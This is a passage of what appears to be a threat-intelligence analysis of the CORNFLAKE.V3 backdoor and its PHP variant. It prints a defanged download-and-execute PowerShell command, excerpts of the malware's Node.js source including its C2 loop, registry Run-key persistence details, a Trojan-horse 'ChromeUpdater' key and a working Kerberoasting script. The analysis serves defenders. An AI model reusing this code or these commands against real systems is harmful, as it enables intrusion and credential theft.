138.199.161[.]141:8080/$u|iex\"\n          ↳ c:\\users\\&lt;user&gt;\\appdata\\roaming\\node-v22.11.0-win-x64\\node.exe \n-e \"{CORNFLAKE.V3}\" \n               ↳ c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \n-c \"{Initial check and System Information Collection}\"\n                    ↳ C:\\Windows\\System32\\ARP.EXE -a\n                    ↳ C:\\Windows\\System32\\chcp.com 65001\n                    ↳ C:\\Windows\\System32\\systeminfo.exe \n                    ↳ C:\\Windows\\System32\\tasklist.exe /svc\n               ↳ c:\\windows\\system32\\cmd.exe /d /s /c \"wmic process where \nprocessid=16004 get commandline\"\n               ↳ C:\\Windows\\System32\\cmd.exe /d /s /c \"{Kerberoasting}\"\n               ↳ c:\\windows\\system32\\cmd.exe /d /s /c \n\"{Active Directory Reconnaissance}\"\n               ↳ c:\\windows\\system32\\cmd.exe /d /s /c \"reg add \n{ChromeUpdater as Persistence}\" </code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Analysis of CORNFLAKE.V3 </span></h3>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The CORNFLAKE.V3 sample recovered in our investigation was completely unobfuscated, which allowed us to statically analyze it in order to understand its functionality. This section describes the primary functions of the malware.</span></p>\n<h4 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Initial Check and System Information Collection</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>if (process.argv[1] !== undefined &amp;&amp; process.argv[2] === undefined) {\n    const child = spawn(process.argv[0], [process.argv[1], '1'], {\n        detached: true,\n        stdio: 'ignore',\n        windowsHide: true,\n    });\n    child.unref();\n    process.exit(0);\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">When the script initially executes, a check verifies the command line arguments of the </span><code style=\"vertical-align: baseline;\">node.exe</code> <span style=\"vertical-align: baseline;\">process, keeping in mind that the binary is initially spawned with a single argument (the script itself), this check forces the script to create a child process which has</span> <code style=\"vertical-align: baseline;\">1</code><span style=\"vertical-align: baseline;\"> as an additional argument, then the initial </span><code style=\"vertical-align: baseline;\">node.exe</code><span style=\"vertical-align: baseline;\"> exits. When the child process runs, since it now has three arguments, it will pass this initial check and execute the rest of the script.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">This check allows the malware to ensure that only one instance of the script is executing at one time, even if it is launched multiple times due to its persistence mechanisms.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Following this, the malware attempts to collect system information using the following code:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>let cmd = execSync('chcp 65001 &gt; $null 2&gt;&amp;1 ; echo \\'version: ' \n+ ver + '\\' ; if ([Security.Principal.WindowsIdentity]::GetCurrent().Name \n-match '(?i)SYSTEM') { \\'Runas: System\\' } elseif \n(([Security.Principal.WindowsPrincipal] \n[Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole\n([Security.Principal.WindowsBuiltInRole]::Administrator)) \n{ \\'Runas: Admin\\' } else { \\'Runas: User\\' } ; systeminfo ; echo \n\\'=-=-=-=-=-\\' ; tasklist /svc ; echo \\'=-=-=-=-=-\\' ; Get-Service | \nSelect-Object -Property Name, DisplayName | Format-List ; \necho \\'=-=-=-=-=-\\' ; Get-PSDrive -PSProvider FileSystem | Format-Table \n-AutoSize ; echo \\'=-=-=-=-=-\\' ; arp -a', { encoding: 'utf-8', shell: \n'powershell.exe', windowsHide: true });\n\ncommandRet = Buffer.from(cmd, 'utf-8');\n\nsysinfo = Buffer.concat([numberBufferInit, numberBufferId, commandRet]);</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">This code block executes a series of PowerShell commands (or fallback CMD commands if PowerShell fails) using </span><code style=\"vertical-align: baseline;\">execSync</code><span style=\"vertical-align: baseline;\">. It gathers the script's version, user privilege level (System, Admin, User), standard </span><span style=\"vertical-align: baseline;\">systeminfo</span><span style=\"vertical-align: baseline;\"> output, running tasks/services (</span><code style=\"vertical-align: baseline;\">tasklist /svc</code><span style=\"vertical-align: baseline;\">), service details (</span><code style=\"vertical-align: baseline;\">Get-Service</code><span style=\"vertical-align: baseline;\">), available drives (</span><code style=\"vertical-align: baseline;\">Get-PSDrive</code><span style=\"vertical-align: baseline;\">), and the ARP table (</span><code style=\"vertical-align: baseline;\">arp -a</code><span style=\"vertical-align: baseline;\">).</span></p>\n<h4 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">C2 Initialization</span></h4>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">After setting some logical constants and the command and control (C2) server IP address, the malware enters the </span><code style=\"vertical-align: baseline;\">mainloop</code> <span style=\"vertical-align: baseline;\">function. The script contains support for two separate lists, </span><code style=\"vertical-align: baseline;\">hosts</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">hostsIP</code><span style=\"vertical-align: baseline;\">, which are both used in the C2 communication logic. Initially, the </span><code style=\"vertical-align: baseline;\">mainloop</code><span style=\"vertical-align: baseline;\"> function attempts to connect to a random host in the</span><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">hosts</code><span style=\"vertical-align: baseline;\"> list, however, if unable to do so, it will attempt to connect to a random IP address in the </span><code style=\"vertical-align: baseline;\">hostsIP</code><span style=\"vertical-align: baseline;\"> list instead. Once a connection is successfully established, the <code>main</code> </span><span style=\"vertical-align: baseline;\">function is called.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>// Define lists of hostnames and IP addresses for the command \nand control server.\nconst hosts = ['159.69.3[.]151'];\nconst hostsIp = ['159.69.3[.]151'];\n\n// Variables to manage the connection and retry logic.\nlet useIp = 0;\nlet delay = 1;\n\n// Main loop to continuously communicate with the command \nand control server.\nasync function mainloop() {\n    let toHost = hosts[Math.floor(Math.random() * 1000) % hosts.length];\n    let toIp = hostsIp[Math.floor(Math.random() * 1000) % hostsIp.length];\n\n    while (true) {\n        // Wait for the specified delay.\n        await new Promise((resolve) =&gt; setTimeout(resolve, delay));\n\n        try {\n            // Attempt to communicate with the command and control server.\n            if (useIp &lt; 200) {\n                await main(toHost, PORT_IP);\n                useIp = 0;\n            } else {\n                await main(toIp, PORT_IP);\n                useIp++;\n                if (useIp &gt;= 210) useIp = 0;\n            }\n        } catch (error) {\n            // Handle errors during communication.\n            console.error('Error with HTTP request:', error.message);\n            toHost = hosts[Math.floor(Math.random() * 1000) % \nhosts.length];\n            toIp = hostsIp[Math.floor(Math.random() * 1000) % \nhostsIp.length];\n            useIp++;\n            delay = 1000 * 10;\n            continue;\n        }\n\n        // Set the delay for the next attempt.\n        delay = 1000 * 60 * 5;\n    }\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">C2 Communication</span></h3>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">This function, named </span><code style=\"vertical-align: baseline;\">main</code><span style=\"vertical-align: baseline;\">, handles the main command and control logic. It takes a host and port number as arguments, and constructs the data to be sent to the C2 server. The malware sends an initial POST request to the path </span><code style=\"vertical-align: baseline;\">/init1234</code><span style=\"vertical-align: baseline;\">, which contains information about the infected system and the output of the last executed command; the contents of this request are XOR-encrypted by the </span><code style=\"vertical-align: baseline;\">enc</code><span style=\"vertical-align: baseline;\"> function.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">This request is answered by the C2 with 2 possible responses:</span></p>\n<ul style=\"text-align: left;\">\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><code style=\"vertical-align: baseline;\">ooff</code><span style=\"vertical-align: baseline;\"> - the process exits</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><code style=\"vertical-align: baseline;\">atst</code><span style=\"vertical-align: baseline;\"> - the <code style=\"vertical-align: baseline;\">atst</code></span><span style=\"vertical-align: baseline;\"> function is called, which establishes persistence on the host</span></p>\n</li>\n</ul>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">If the response does not match one of the aforementioned 2 values, the malware interprets the response as a payload and parses the last byte of the response after XOR decrypting it. The following values are accepted by the program:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Command</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Type</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">0</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">EXE</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The received payload is written to </span><code style=\"vertical-align: baseline;\">%APPDATA%\\&lt;random_8_chars&gt;\\&lt;random_8_chars&gt;.exe</code><span style=\"vertical-align: baseline;\"> and launched using the Node.js </span><code style=\"vertical-align: baseline;\">child_process.spawn()</code> <span style=\"vertical-align: baseline;\">function</span><span style=\"vertical-align: baseline;\">.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">1</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DLL</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The received payload is written to </span><code style=\"vertical-align: baseline;\">%APPDATA%\\&lt;random_8_chars&gt;\\&lt;random_8_chars&gt;.dll</code><span style=\"vertical-align: baseline;\"> and launched using the Node.js </span><code style=\"vertical-align: baseline;\">child_process.spawn()</code> <span style=\"vertical-align: baseline;\">function</span><span style=\"vertical-align: baseline;\"> as an argument to </span><span style=\"vertical-align: baseline;\">rundll32.exe</span><span style=\"vertical-align: baseline;\">.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">2</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">JS</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The received payload is launched from memory as an argument to </span><span style=\"vertical-align: baseline;\">node.exe </span><span style=\"vertical-align: baseline;\">using the Node.js </span><code style=\"vertical-align: baseline;\">child_process.spawn()</code> <span style=\"vertical-align: baseline;\">function</span><span style=\"vertical-align: baseline;\">.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">3</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">CMD</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The received payload is launched from memory as an argument to </span><code style=\"vertical-align: baseline;\">cmd.exe</code> <span style=\"vertical-align: baseline;\">using the Node.js </span><code style=\"vertical-align: baseline;\">child_process.spawn()</code> <span style=\"vertical-align: baseline;\">function</span><span style=\"vertical-align: baseline;\">. Additionally, the output is saved in the </span><code style=\"vertical-align: baseline;\">LastCmd</code><span style=\"vertical-align: baseline;\"> variable and sent to the C2 in the next request.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">4</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Other</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The payload is written to </span><code style=\"vertical-align: baseline;\">%APPDATA%\\&lt;random_8_chars&gt;\\&lt;random_8_chars&gt;.log</code><span style=\"vertical-align: baseline;\">.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div style=\"color: #5f6368; overflow: auto hidden; width: 100%; text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 2: CORNFLAKE.V3 supported payloads</span></div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Persistence</span></h4>\n<p><span style=\"vertical-align: baseline;\">The </span><span style=\"vertical-align: baseline;\">atst</span><span style=\"vertical-align: baseline;\"> function, called by <code>main</code></span><span style=\"vertical-align: baseline;\">, attempts to establish persistence on the host by creating a new registry Run key named </span><code style=\"vertical-align: baseline;\">ChromeUpdater</code> <span style=\"vertical-align: baseline;\">under </span><code style=\"vertical-align: baseline;\">HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">The malware uses </span><code style=\"vertical-align: baseline;\">wmic.exe</code><span style=\"vertical-align: baseline;\"> to obtain the command line arguments of the currently running </span><code style=\"vertical-align: baseline;\">node.exe</code><span style=\"vertical-align: baseline;\"> process. If </span><code style=\"vertical-align: baseline;\">node.exe</code><span style=\"vertical-align: baseline;\"> was launched with the </span><code style=\"vertical-align: baseline;\">-e</code><span style=\"vertical-align: baseline;\"> argument, like the malware does initially, the script extracts the argument after </span><code style=\"vertical-align: baseline;\">-e</code><span style=\"vertical-align: baseline;\">, which contains the full malicious script. This script is written to the </span><code style=\"vertical-align: baseline;\">&lt;random_8_chars&gt;.log</code><span style=\"vertical-align: baseline;\"> file in the Node.js installation directory and its path is saved to the </span><code style=\"vertical-align: baseline;\">path2file</code><span style=\"vertical-align: baseline;\"> variable.</span></p>\n<p><span style=\"vertical-align: baseline;\">If </span><code style=\"vertical-align: baseline;\">node.exe</code><span style=\"vertical-align: baseline;\"> was instead launched with a file as an argument (such as during the persistence phase), the path to this file is extracted and saved to the </span><code style=\"vertical-align: baseline;\">path2file</code><span style=\"vertical-align: baseline;\"> variable.</span></p>\n<p><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">path2file</code><span style=\"vertical-align: baseline;\"> variable is then set as an argument to</span> <code style=\"vertical-align: baseline;\">node.exe</code><span style=\"vertical-align: baseline;\"> in the newly created </span><code style=\"vertical-align: baseline;\">ChromeUpdater</code><span style=\"vertical-align: baseline;\"> registry key. This ensures that the malware executes upon user logon.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Executed Payloads</span></h3>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">As observed in the main </span><span style=\"vertical-align: baseline;\">function, this sample can receive and execute different types of payloads from its C2 server. This section describes two payloads that were observed in our investigation.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Active Directory Reconnaissance</span></h4>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The first payload observed on the host was a batch script containing reconnaissance commands. The script initially determines if the host is domain-joined, this condition determines which specific reconnaissance type is executed.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Domain Joined</span></h5>\n<ul>\n<li style=\"text-align: left;\"><span style=\"font-style: italic; vertical-align: baseline;\">Query Active Directory Computer Count</span><span style=\"vertical-align: baseline;\">: Attempts to connect to Active Directory and count the total number of computer objects registered in the domain.</span></li>\n<li style=\"text-align: left;\"><span style=\"font-style: italic; vertical-align: baseline;\">Display Detailed User Context</span><span style=\"vertical-align: baseline;\">: Executes</span><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">whoami /all</code><span style=\"vertical-align: baseline;\"> to reveal the current user's Security Identifier (SID), domain and local group memberships, and assigned security privileges.</span></li>\n<li style=\"text-align: left;\"><span style=\"font-style: italic; vertical-align: baseline;\">Enumerate Domain Trusts</span><span style=\"vertical-align: baseline;\">: Executes </span><code style=\"vertical-align: baseline;\">nltest /domain_trusts</code><span style=\"vertical-align: baseline;\"> to list all domains that the current computer's domain has trust relationships with (both incoming and outgoing).</span></li>\n<li style=\"text-align: left;\"><span style=\"font-style: italic; vertical-align: baseline;\">List Domain Controllers</span><span style=\"vertical-align: baseline;\">: Executes </span><code style=\"vertical-align: baseline;\">nltest /dclist :</code><span style=\"vertical-align: baseline;\"> to find and list the available Domain Controllers (DCs) for the computer's current domain.</span></li>\n<li style=\"text-align: left;\"><span style=\"font-style: italic; vertical-align: baseline;\">Query Service Principal Names (SPNs)</span><span style=\"vertical-align: baseline;\">: Executes </span><code style=\"vertical-align: baseline;\">setspn -T &lt;UserDomain&gt; -Q */*</code> <span style=\"vertical-align: baseline;\">to query for all SPNs registered in the user's logon domain, then filters the results (Select-String) to specifically highlight SPNs potentially associated with user accounts (lines starting CN=...Users).</span></li>\n</ul>\n<h5 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Not Domain Joined</span></h5>\n<ul>\n<li style=\"text-align: left;\"><span style=\"font-style: italic; vertical-align: baseline;\">Enumerate Local Groups</span><span style=\"vertical-align: baseline;\">: Uses </span><code style=\"vertical-align: baseline;\">Get-LocalGroup</code><span style=\"vertical-align: baseline;\"> to list all security groups defined locally on the machine.</span></li>\n<li style=\"text-align: left;\"><span style=\"font-style: italic; vertical-align: baseline;\">Enumerate Local Group Members</span><span style=\"vertical-align: baseline;\">: For each local group found, uses </span><code style=\"vertical-align: baseline;\">Get-LocalGroupMember</code><span style=\"vertical-align: baseline;\"> to list the accounts (users or other groups) that are members of that group, displaying their Name and PrincipalSource (e.g., Local, MicrosoftAccount).</span></li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Kerberoasting</span></h4>\n<p><span style=\"vertical-align: baseline;\">The second script executed is a batch script which attempts to harvest credentials via Kerberoasting. The script queries Active Directory for user accounts configured with SPNs (often an indication of a service account using user credentials). For each of these, it requests a Kerberos service ticket from which a password hash is extracted and formatted. These hashes are exfiltrated to the C2 server, where the attacker can attempt to crack them.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>$a = 'System.IdentityModel';\n$b = [Reflection.Assembly]::LoadWithPartialName($a);\n$c = New - Object DirectoryServices.DirectorySearcher([ADSI]'');\n$c.filter = '(&amp;(servicePrincipalName=*)(objectCategory=user))';\n$d = $c.Findall();\nforeach($e in $d) {\n    $f = $e.GetDirectoryEntry();\n    $g = $f.samAccountName;\n    if ($g  - ne 'krbtgt')  {\n        Start - Sleep  - Seconds (Get - Random  - Minimum 1  \n- Maximum 11);\n        foreach($h in $f.servicePrincipalName) {\n            $i = $null;\n            try {\n                $i = New - \nObject System.IdentityModel.Tokens.KerberosRequestorSecurityToken  \n- ArgumentList $h;\n            } catch {}\n            if ($i  - ne $null)  {\n                $j = $i.GetRequest();\n                if ($j)  {\n                    $k = [System.BitConverter]::ToString($j) - replace'-';\n                    [System.Collections.ArrayList]$l = \n($k - replace'^(.*?)04820...(.*)', '$2') - Split'A48201';\n                    $l.RemoveAt($l.Count - 1);\n                    $m = $l - join'A48201';\n                    try {\n                        $m = $m.Insert(32, '$');\n                        $n = '$krb5tgs$23$*' + $g + '/' + $h + '*$' + $m;\n                        Write - Host $n;\n                        break;\n                    } catch {}}}}}}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">PHP Variant</span></h3>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Mandiant Threat Defense recently observed a new PHP-based CORNFLAKE.V3 variant which has similar functionality to the previous Node.js based iterations.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">This version was dropped by an in-memory script which was executed as a result of interaction with a malicious ClickFix lure page.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The script downloads the PHP package from </span><code style=\"vertical-align: baseline;\">windows.php[.]net</code><span style=\"vertical-align: baseline;\">,</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">writes it to disk as </span><code style=\"vertical-align: baseline;\">php.zip</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">and extracts its contents to the </span><code style=\"vertical-align: baseline;\">C:\\Users\\&lt;User&gt;\\AppData\\Roaming\\php\\</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">directory</span><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">The CORNFLAKE.V3 PHP sample is contained in the</span> <code style=\"vertical-align: baseline;\">config.cfg</code><span style=\"vertical-align: baseline;\"> file that was also dropped in the same directory and executed with the following command line arguments:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>\"C:\\\\Users\\&lt;User&gt;\\AppData\\Roaming\\php\\php.exe\" -d extension=zip -d \nextension_dir=ext C:\\Users\\&lt;User&gt;\\AppData\\Roaming\\php\\config.cfg 1</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">To maintain persistence on the host, this variant utilizes a registry Run key named after a randomly chosen directory in </span><code style=\"vertical-align: baseline;\">%APPDATA%</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">%LOCALAPPDATA%</code><span style=\"vertical-align: baseline;\"> instead of the fixed </span><code style=\"vertical-align: baseline;\">ChromeUpdater</code><span style=\"vertical-align: baseline;\"> string used in the Node.js version. To communicate with its C2 a unique path is generated for each request, unlike the static</span> <code style=\"vertical-align: baseline;\">/init1234</code><span style=\"vertical-align: baseline;\"> path:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>POST /ue/2&amp;290cd148ed2f4995f099b7370437509b/fTqvlt HTTP/1.1  \nHost: varying-rentals-calgary-predict.trycloudflare[.]com  \nConnection: close  \nContent-Length: 39185  \nContent-type: application/octet-stream</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Much like the Node.js</span><span style=\"vertical-align: baseline;\"> version, the last byte of the received payload determines the payload type, however, these values differ in the PHP version:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<thead>\n<tr>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Command</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Type</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Notes</strong></p>\n</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">0</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">EXE</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">This decrypted content is saved to a temporary executable file (</span><code style=\"vertical-align: baseline;\">&lt;rand_8_char&gt;.exe</code><span style=\"vertical-align: baseline;\">) created in a random directory within the user's </span><code style=\"vertical-align: baseline;\">%APPDATA%</code><span style=\"vertical-align: baseline;\"> folder, and executed through </span><code style=\"vertical-align: baseline;\">PowerShell</code><span style=\"vertical-align: baseline;\"> as a hidden process.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">1</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DLL</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">The decrypted content is saved as a </span><code style=\"vertical-align: baseline;\">&lt;rand_8_char&gt;.png</code><span style=\"vertical-align: baseline;\"> file in a temporary 